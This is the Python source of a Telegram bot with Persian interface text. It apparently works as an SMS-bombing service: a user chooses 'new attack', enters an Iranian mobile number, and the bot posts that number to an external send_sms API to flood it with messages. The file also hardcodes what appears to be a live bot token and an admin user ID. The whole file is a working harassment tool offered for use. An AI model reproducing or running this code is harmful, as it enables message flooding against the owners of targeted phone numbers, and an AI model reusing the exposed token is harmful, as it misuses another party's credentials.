# -*- coding: utf-8 -*-
import telebot
from telebot import types
import requests
import threading
import time
from datetime import datetime

TOKEN = "8295266586:AAHGlLZC0Ha4-V1AOfsnJUd8xphqrVX5kBs"
ADMIN_ID = 8226091292
LIARA_API = "https://top-topye.liara.run/api/send_sms"

bot = telebot.TeleBot(TOKEN)

user_states = {}
active_attacks = {}
user_daily = {}
DAILY_LIMIT = 5
bot_active = True

def is_admin(user_id):
    return user_id == ADMIN_ID

def check_daily(user_id):
    today = datetime.now().date()
    if user_id in user_daily:
        if user_daily[user_id]['date'] == today:
            return user_daily[user_id]['count'] < DAILY_LIMIT
    return True

# ========== استارت ==========
@bot.message_handler(commands=['start'])
def start(message):
    global bot_active
    if not bot_active and not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ ربات غیرفعال است")
        return

    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('🚀 حمله جدید')
    btn2 = types.KeyboardButton('📊 وضعیت')
    btn3 = types.KeyboardButton('⛔ توقف')
    
    if is_admin(message.from_user.id):
        btn4 = types.KeyboardButton('👑 پنل ادمین')
        markup.add(btn1, btn2, btn3, btn4)
    else:
        markup.add(btn1, btn2, btn3)
    
    bot.reply_to(message, "ربات آماده است!", reply_markup=markup)

# ========== پنل ادمین ==========
@bot.message_handler(func=lambda m: m.text == '👑 پنل ادمین' and is_admin(m.from_user.id))
def admin_panel(m):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('📊 آمار', '🔴 خاموش', '🟢 روشن', '🔙 برگشت')
    bot.reply_to(m, "پنل مدیریت:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '📊 آمار' and is_admin(m.from_user.id))
def admin_stats(m):
    active = len([x for x in active_attacks.values() if x])
    total = len(user_daily)
    status = "روشن" if bot_active else "خاموش"
    bot.reply_to(m, f"📊 آمار:\nوضعیت: {status}\nکاربران: {total}\nحملات فعال: {active}")

@bot.message_handler(func=lambda m: m.text == '🔴 خاموش' and is_admin(m.from_user.id))
def admin_off(m):
    global bot_active
    bot_active = False
    bot.reply_to(m, "🔴 ربات خاموش شد")

@bot.message_handler(func=lambda m: m.text == '🟢 روشن' and is_admin(m.from_user.id))
def admin_on(m):
    global bot_active
    bot_active = True
    bot.reply_to(m, "🟢 ربات روشن شد")

@bot.message_handler(func=lambda m: m.text == '🔙 برگشت' and is_admin(m.from_user.id))
def admin_back(m):
    start(m)

# ========== حمله جدید ==========
@bot.message_handler(func=lambda m: m.text == '🚀 حمله جدید')
def new_attack(m):
    global bot_active
    if not bot_active and not is_admin(m.from_user.id):
        bot.reply_to(m, "⛔ ربات غیرفعال است")
        return
    if not check_daily(m.chat.id) and not is_admin(m.chat.id):
        bot.reply_to(m, "⚠️ محدودیت روزانه تموم شد")
        return
    user_states[m.chat.id] = "waiting"
    bot.reply_to(m, "📱 شماره رو بفرست:")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "waiting")
def get_phone(m):
    phone = m.text.strip()
    if len(phone) != 11 or not phone.startswith('09'):
        bot.reply_to(m, "❌ شماره نامعتبر")
        return
    
    del user_states[m.chat.id]
    active_attacks[m.chat.id] = True
    bot.reply_to(m, f"✅ شروع شد...")
    
    threading.Thread(target=run, args=(phone, m.chat.id)).start()

def run(phone, cid):
    try:
        r = requests.post(LIARA_API, json={'phone': phone}, timeout=30)
        if r.status_code == 200:
            bot.send_message(cid, "✅ حمله انجام شد!")
        else:
            bot.send_message(cid, "❌ خطا")
    except:
        bot.send_message(cid, "❌ خطا")
    finally:
        if cid in active_attacks:
            del active_attacks[cid]

# ========== وضعیت ==========
@bot.message_handler(func=lambda m: m.text == '📊 وضعیت')
def status(m):
    if m.chat.id in active_attacks:
        bot.reply_to(m, "⚠️ در حال اجرا")
    else:
        bot.reply_to(m, "✅ آماده")

# ========== توقف ==========
@bot.message_handler(func=lambda m: m.text == '⛔ توقف')
def stop(m):
    if m.chat.id in active_attacks:
        active_attacks[m.chat.id] = False
        bot.reply_to(m, "⛔ توقف شد")
    else:
        bot.reply_to(m, "❌ حمله فعالی نیست")

# ========== اجرا ==========
if __name__ == "__main__":
    print("ربات با پنل ادمین راه‌اندازی شد")
    bot.infinity_polling()
